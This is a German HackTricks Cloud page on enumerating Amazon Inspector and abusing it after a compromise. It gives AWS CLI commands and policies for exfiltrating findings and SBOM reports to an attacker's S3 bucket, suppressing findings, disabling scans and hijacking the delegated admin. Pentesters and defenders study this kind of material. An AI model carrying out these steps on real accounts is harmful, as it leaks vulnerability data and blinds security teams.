# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

### Inspector

Amazon Inspector ist ein fortschrittlicher, automatisierter Schwachstellenmanagementdienst, der entwickelt wurde, um die Sicherheit Ihrer AWS-Umgebung zu verbessern. Dieser Dienst scannt kontinuierlich Amazon EC2-Instanzen, Container-Images in Amazon ECR, Amazon ECS und AWS Lambda-Funktionen auf Schwachstellen und unbeabsichtigte Netzwerkaussetzungen. Durch die Nutzung einer robusten Schwachstellen-Intelligenzdatenbank bietet Amazon Inspector detaillierte Ergebnisse, einschlie√ülich Schweregraden und Empfehlungen zur Behebung, die Organisationen helfen, Sicherheitsrisiken proaktiv zu identifizieren und zu beheben. Dieser umfassende Ansatz gew√§hrleistet eine verst√§rkte Sicherheitslage √ºber verschiedene AWS-Dienste hinweg und unterst√ºtzt die Einhaltung von Vorschriften und das Risikomanagement.

### Schl√ºsselfaktoren

#### Ergebnisse

Ergebnisse in Amazon Inspector sind detaillierte Berichte √ºber Schwachstellen und Aussetzungen, die w√§hrend des Scans von EC2-Instanzen, ECR-Repositorys oder Lambda-Funktionen entdeckt wurden. Basierend auf ihrem Status werden die Ergebnisse kategorisiert als:

* **Aktiv**: Das Ergebnis wurde nicht behoben.
* **Geschlossen**: Das Ergebnis wurde behoben.
* **Unterdr√ºckt**: Das Ergebnis wurde aufgrund von einem oder mehreren **Unterdr√ºckungsregeln** mit diesem Status markiert.

Die Ergebnisse werden auch in die folgenden drei Typen kategorisiert:

* **Paket**: Diese Ergebnisse beziehen sich auf Schwachstellen in Softwarepaketen, die auf Ihren Ressourcen installiert sind. Beispiele sind veraltete Bibliotheken oder Abh√§ngigkeiten mit bekannten Sicherheitsproblemen.
* **Code**: Diese Kategorie umfasst Schwachstellen, die im Code von Anwendungen gefunden werden, die auf Ihren AWS-Ressourcen ausgef√ºhrt werden. H√§ufige Probleme sind Programmierfehler oder unsichere Praktiken, die zu Sicherheitsverletzungen f√ºhren k√∂nnten.
* **Netzwerk**: Netzwerk-Ergebnisse identifizieren potenzielle Aussetzungen in Netzwerkkonfigurationen, die von Angreifern ausgenutzt werden k√∂nnten. Dazu geh√∂ren offene Ports, unsichere Netzwerkprotokolle und falsch konfigurierte Sicherheitsgruppen.

#### Filter und Unterdr√ºckungsregeln

Filter und Unterdr√ºckungsregeln in Amazon Inspector helfen, Ergebnisse zu verwalten und zu priorisieren. Filter erm√∂glichen es Ihnen, Ergebnisse basierend auf bestimmten Kriterien wie Schweregrad oder Ressourcentyp zu verfeinern. Unterdr√ºckungsregeln erm√∂glichen es Ihnen, bestimmte Ergebnisse zu unterdr√ºcken, die als geringes Risiko angesehen werden, bereits gemindert wurden oder aus anderen wichtigen Gr√ºnden, um zu verhindern, dass sie Ihre Sicherheitsberichte √ºberladen und Ihnen zu erm√∂glichen, sich auf kritischere Probleme zu konzentrieren.

#### Software-Bill-of-Materials (SBOM)

Eine Software-Bill-of-Materials (SBOM) in Amazon Inspector ist eine exportierbare verschachtelte Inventarliste, die alle Komponenten innerhalb eines Softwarepakets, einschlie√ülich Bibliotheken und Abh√§ngigkeiten, detailliert. SBOMs helfen, Transparenz in der Software-Lieferkette zu schaffen, was ein besseres Schwachstellenmanagement und Compliance erm√∂glicht. Sie sind entscheidend f√ºr die Identifizierung und Minderung von Risiken, die mit Open-Source- und Drittanbieter-Softwarekomponenten verbunden sind.

### Hauptmerkmale

#### Ergebnisse exportieren

Amazon Inspector bietet die M√∂glichkeit, Ergebnisse in Amazon S3-Buckets, Amazon EventBridge und AWS Security Hub zu exportieren, was es Ihnen erm√∂glicht, detaillierte Berichte √ºber identifizierte Schwachstellen und Aussetzungen f√ºr eine weitere Analyse oder zum Teilen zu einem bestimmten Datum und Zeitpunkt zu erstellen. Diese Funktion unterst√ºtzt verschiedene Ausgabeformate wie CSV und JSON, was die Integration mit anderen Tools und Systemen erleichtert. Die Exportfunktionalit√§t erm√∂glicht die Anpassung der in den Berichten enthaltenen Daten, sodass Sie Ergebnisse basierend auf bestimmten Kriterien wie Schweregrad, Ressourcentyp oder Datumsbereich filtern und standardm√§√üig alle Ihre Ergebnisse im aktuellen AWS-Region mit einem aktiven Status einbeziehen k√∂nnen.

Beim Exportieren von Ergebnissen ist ein Schl√ºsselverwaltungsdienst (KMS)-Schl√ºssel erforderlich, um die Daten w√§hrend des Exports zu verschl√ºsseln. KMS-Schl√ºssel stellen sicher, dass die exportierten Ergebnisse vor unbefugtem Zugriff gesch√ºtzt sind und bieten eine zus√§tzliche Sicherheitsebene f√ºr sensible Schwachstelleninformationen.

#### Scannen von Amazon EC2-Instanzen

Amazon Inspector bietet robuste Scanfunktionen f√ºr Amazon EC2-Instanzen, um Schwachstellen und Sicherheitsprobleme zu erkennen. Inspector verglich extrahierte Metadaten von der EC2-Instanz mit Regeln aus Sicherheitsberatungen, um Paket-Schwachstellen und Netzwerk-Erreichbarkeitsprobleme zu erzeugen. Diese Scans k√∂nnen durch **agentenbasierte** oder **agentenlose** Methoden durchgef√ºhrt werden, abh√§ngig von der Konfiguration der **Scanmodus**-Einstellungen Ihres Kontos.

* **Agentenbasiert**: Nutzt den AWS Systems Manager (SSM)-Agenten, um umfassende Scans durchzuf√ºhren. Diese Methode erm√∂glicht eine umfassende Datensammlung und -analyse direkt von der Instanz.
* **Agentenlos**: Bietet eine leichte Alternative, die keine Installation eines Agenten auf der Instanz erfordert, indem ein EBS-Snapshot jedes Volumes der EC2-Instanz erstellt, nach Schwachstellen sucht und ihn dann l√∂scht; nutzt die vorhandene AWS-Infrastruktur f√ºr Scans.

Der Scanmodus bestimmt, welche Methode verwendet wird, um EC2-Scans durchzuf√ºhren:

* **Agentenbasiert**: Beinhaltet die Installation des SSM-Agenten auf EC2-Instanzen f√ºr eine tiefgehende Inspektion.
* **Hybrides Scannen**: Kombiniert sowohl agentenbasierte als auch agentenlose Methoden, um die Abdeckung zu maximieren und die Leistungseinbu√üen zu minimieren. In den EC2-Instanzen, auf denen der SSM-Agent installiert ist, f√ºhrt Inspector einen agentenbasierten Scan durch, und f√ºr diejenigen, auf denen kein SSM-Agent vorhanden ist, wird der durchgef√ºhrte Scan agentenlos sein.

Ein weiteres wichtiges Merkmal ist die **tiefgehende Inspektion** f√ºr EC2-Linux-Instanzen. Diese Funktion bietet eine gr√ºndliche Analyse der Software und Konfiguration von EC2-Linux-Instanzen und liefert detaillierte Schwachstellenbewertungen, einschlie√ülich Betriebssystem-Schwachstellen, Anwendungs-Schwachstellen und Fehlkonfigurationen, um eine umfassende Sicherheitsbewertung sicherzustellen. Dies wird durch die Inspektion von **benutzerdefinierten Pfaden** und allen seinen Unterverzeichnissen erreicht. Standardm√§√üig scannt Amazon Inspector Folgendes, aber jedes Mitgliedskonto kann bis zu 5 weitere benutzerdefinierte Pfade definieren, und jeder delegierte Administrator bis zu 10:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Scannen von Amazon ECR-Container-Images

Amazon Inspector bietet robuste Scanfunktionen f√ºr Amazon Elastic Container Registry (ECR)-Container-Images, um sicherzustellen, dass Paket-Schwachstellen effizient erkannt und verwaltet werden.

* **Basis-Scanning**: Dies ist ein schneller und leichter Scan, der bekannte OS-Paket-Schwachstellen in Container-Images mithilfe eines standardisierten Regelwerks aus dem Open-Source-Projekt Clair identifiziert. Mit dieser Scan-Konfiguration werden Ihre Repositorys beim Push oder durch manuelle Scans gescannt.
* **Erweitertes Scannen**: Diese Option f√ºgt die kontinuierliche Scanfunktion zus√§tzlich zum Push-Scan hinzu. Das erweiterte Scannen geht tiefer in die Schichten jedes Container-Images, um Schwachstellen in OS-Paketen und in Programmiersprachen-Paketen mit h√∂herer Genauigkeit zu identifizieren. Es analysiert sowohl das Basis-Image als auch alle zus√§tzlichen Schichten und bietet einen umfassenden √úberblick √ºber potenzielle Sicherheitsprobleme.

#### Scannen von Amazon Lambda-Funktionen

Amazon Inspector umfasst umfassende Scanfunktionen f√ºr AWS Lambda-Funktionen und deren Schichten, um die Sicherheit und Integrit√§t serverloser Anwendungen zu gew√§hrleisten. Inspector bietet zwei Arten von Scans f√ºr Lambda-Funktionen:

* **Lambda-Standard-Scanning**: Diese Standardfunktion identifiziert Software-Schwachstellen in den Anwendungs-Paketabh√§ngigkeiten, die zu Ihrer Lambda-Funktion und den Schichten hinzugef√ºgt wurden. Wenn Ihre Funktion beispielsweise eine Version einer Bibliothek wie python-jwt mit einer bekannten Schwachstelle verwendet, wird ein Ergebnis generiert.
* **Lambda-Code-Scanning**: Analysiert benutzerdefinierten Anwendungscode auf Sicherheitsprobleme und erkennt Schwachstellen wie Injektionsfehler, Datenlecks, schwache Kryptografie und fehlende Verschl√ºsselung. Es erfasst Code-Snippets, die erkannte Schwachstellen hervorheben, wie z. B. hardcodierte Anmeldeinformationen. Ergebnisse enthalten detaillierte Vorschl√§ge zur Behebung und Code-Snippets zur Behebung der Probleme.

#### **Center for Internet Security (CIS) Scans**

Amazon Inspector umfasst CIS-Scans, um die Betriebssysteme von Amazon EC2-Instanzen mit den Best-Practice-Empfehlungen des Center for Internet Security (CIS) zu benchmarken. Diese Scans stellen sicher, dass die Konfigurationen den branchen√ºblichen Sicherheitsgrundlagen entsprechen.

* **Konfiguration**: CIS-Scans bewerten, ob die Systemkonfigurationen bestimmten CIS-Benchmark-Empfehlungen entsprechen, wobei jeder Check mit einer CIS-Check-ID und einem Titel verkn√ºpft ist.
* **Ausf√ºhrung**: Scans werden basierend auf Instanz-Tags und definierten Zeitpl√§nen durchgef√ºhrt oder geplant.
* **Ergebnisse**: Die Ergebnisse nach dem Scan zeigen an, welche Checks bestanden, √ºbersprungen oder fehlgeschlagen sind und bieten Einblicke in die Sicherheitslage jeder Instanz.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
Aus der Perspektive eines Angreifers kann dieser Dienst dem Angreifer helfen, Schwachstellen und Netzwerkexpositionen zu finden, die ihm helfen k√∂nnten, andere Instanzen/Container zu kompromittieren.

Ein Angreifer k√∂nnte jedoch auch daran interessiert sein, diesen Dienst zu st√∂ren, sodass das Opfer Schwachstellen (alle oder spezifische) nicht sehen kann.
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Ein Angreifer k√∂nnte detaillierte Berichte √ºber Schwachstellen oder Software-Bill of Materials (SBOMs) erstellen und diese aus Ihrer AWS-Umgebung exfiltrieren. Diese Informationen k√∂nnten ausgenutzt werden, um spezifische Schw√§chen, veraltete Software oder unsichere Abh√§ngigkeiten zu identifizieren, was gezielte Angriffe erm√∂glicht.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **Erstellen Sie einen Amazon S3 Bucket** und f√ºgen Sie eine Richtlinie hinzu, damit er vom Opfer Amazon Inspector zug√§nglich ist:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Erstellen Sie einen Amazon KMS-Schl√ºssel** und f√ºgen Sie eine Richtlinie hinzu, damit er vom Amazon Inspector des Opfers verwendet werden kann:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. F√ºhren Sie den Befehl aus, um den **Bericht √ºber die Ergebnisse** zu erstellen und ihn exfiltrieren:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **Potenzielle Auswirkungen**: Erstellung und Exfiltration detaillierter Berichte √ºber Schwachstellen und Software, Einblicke in spezifische Schwachstellen und Sicherheitsanf√§lligkeiten gewinnen.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Ein Angreifer k√∂nnte die Erstellung des angegebenen Berichts √ºber Schwachstellen oder des SBOM-Berichts abbrechen, wodurch Sicherheitsteams daran gehindert werden, rechtzeitig Informationen √ºber Schwachstellen und Software-Bill of Materials (SBOMs) zu erhalten, was die Erkennung und Behebung von Sicherheitsproblemen verz√∂gert.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Potenzielle Auswirkungen**: St√∂rung der Sicherheits√ºberwachung und Verhinderung einer zeitnahen Erkennung und Behebung von Sicherheitsproblemen.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Ein Angreifer mit diesen Berechtigungen k√∂nnte die Filterregeln manipulieren, die bestimmen, welche Schwachstellen und Sicherheitsprobleme gemeldet oder unterdr√ºckt werden (wenn die **Aktion** auf SUPPRESS gesetzt ist, w√ºrde eine Unterdr√ºckungsregel erstellt). Dies k√∂nnte kritische Schwachstellen vor Sicherheitsadministratoren verbergen und es erleichtern, diese Schw√§chen unentdeckt auszunutzen. Durch das √Ñndern oder Entfernen wichtiger Filter k√∂nnte ein Angreifer auch L√§rm erzeugen, indem er das System mit irrelevanten Ergebnissen √ºberflutet, was eine effektive Sicherheits√ºberwachung und -reaktion behindert.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Potenzielle Auswirkungen**: Verbergung oder Unterdr√ºckung kritischer Schwachstellen oder √úberflutung des Systems mit irrelevanten Ergebnissen.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Ein Angreifer k√∂nnte die Sicherheitsmanagementstruktur erheblich st√∂ren.

* Durch Deaktivierung des delegierten Administratorkontos k√∂nnte der Angreifer das Sicherheitsteam daran hindern, auf die Amazon Inspector-Einstellungen und -Berichte zuzugreifen und diese zu verwalten.
* Die Aktivierung eines unbefugten Administratorkontos w√ºrde es einem Angreifer erm√∂glichen, Sicherheitskonfigurationen zu steuern, m√∂glicherweise Scans zu deaktivieren oder Einstellungen zu √§ndern, um b√∂swillige Aktivit√§ten zu verbergen.

{% hint style="warning" %}
Es ist erforderlich, dass das unbefugte Konto in derselben Organisation wie das Opfer ist, um der delegierte Administrator zu werden.

Damit das unbefugte Konto der delegierte Administrator werden kann, ist es auch erforderlich, dass, nachdem der legitime delegierte Administrator deaktiviert wurde und bevor das unbefugte Konto als delegierter Administrator aktiviert wird, der legitime Administrator als delegierter Administrator aus der Organisation abgemeldet werden muss. Dies kann mit dem folgenden Befehl durchgef√ºhrt werden (**`organizations:DeregisterDelegatedAdministrator`** Berechtigung erforderlich): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **Potenzielle Auswirkungen**: St√∂rung des Sicherheitsmanagements.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Ein Angreifer k√∂nnte die Zuordnung von Mitgliedskonten innerhalb einer Amazon Inspector-Organisation manipulieren. Durch die Zuordnung unautorisierter Konten oder die Trennung legitimer Konten k√∂nnte ein Angreifer kontrollieren, welche Konten in Sicherheits√ºberpr√ºfungen und Berichterstattung einbezogen werden. Dies k√∂nnte dazu f√ºhren, dass kritische Konten von der Sicherheits√ºberwachung ausgeschlossen werden, was es dem Angreifer erm√∂glicht, Schwachstellen in diesen Konten unentdeckt auszunutzen.

{% hint style="warning" %}
Diese Aktion muss von dem delegierten Administrator durchgef√ºhrt werden.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **Potenzielle Auswirkungen**: Ausschluss von Schl√ºsselkonten von Sicherheits√ºberpr√ºfungen, was die unentdeckte Ausnutzung von Schwachstellen erm√∂glicht.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Ein Angreifer mit der Berechtigung `inspector2:Disable` k√∂nnte Sicherheits√ºberpr√ºfungen f√ºr bestimmte Ressourcentypen (EC2, ECR, Lambda, Lambda-Code) √ºber die angegebenen Konten deaktivieren, wodurch Teile der AWS-Umgebung un√ºberwacht und anf√§llig f√ºr Angriffe bleiben. Dar√ºber hinaus k√∂nnte ein Angreifer aufgrund der Berechtigungen **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** dann selektiv √úberpr√ºfungen wieder aktivieren, um die Erkennung verd√§chtiger Konfigurationen zu vermeiden.

{% hint style="warning" %}
Diese Aktion muss von dem delegierten Administrator durchgef√ºhrt werden.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Potenzielle Auswirkungen**: Erstellung von blinden Flecken in der Sicherheits√ºberwachung.

#### `inspector2:UpdateOrganizationConfiguration`

Ein Angreifer mit dieser Berechtigung k√∂nnte die Konfigurationen f√ºr Ihre Amazon Inspector-Organisation aktualisieren, was die standardm√§√üigen Scanfunktionen f√ºr neue Mitgliedskonten beeinflusst.

{% hint style="warning" %}
Diese Aktion muss von dem delegierten Administrator durchgef√ºhrt werden.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Potenzielle Auswirkungen**: √Ñndern Sie Sicherheits-Scan-Richtlinien und -Konfigurationen f√ºr die Organisation.

#### `inspector2:TagResource`, `inspector2:UntagResource`

Ein Angreifer k√∂nnte Tags auf AWS Inspector-Ressourcen manipulieren, die entscheidend f√ºr die Organisation, Verfolgung und Automatisierung von Sicherheitsbewertungen sind. Durch das √Ñndern oder Entfernen von Tags k√∂nnte ein Angreifer potenziell Schwachstellen vor Sicherheits-Scans verbergen, die Compliance-Berichterstattung st√∂ren und automatisierte Behebungsprozesse beeintr√§chtigen, was zu unkontrollierten Sicherheitsproblemen und einer gef√§hrdeten Systemintegrit√§t f√ºhren k√∂nnte.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potenzielle Auswirkungen**: Verbergen von Schwachstellen, St√∂rung der Compliance-Berichterstattung, St√∂rung der Sicherheitsautomatisierung und St√∂rung der Kostenverteilung.

## Referenzen

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
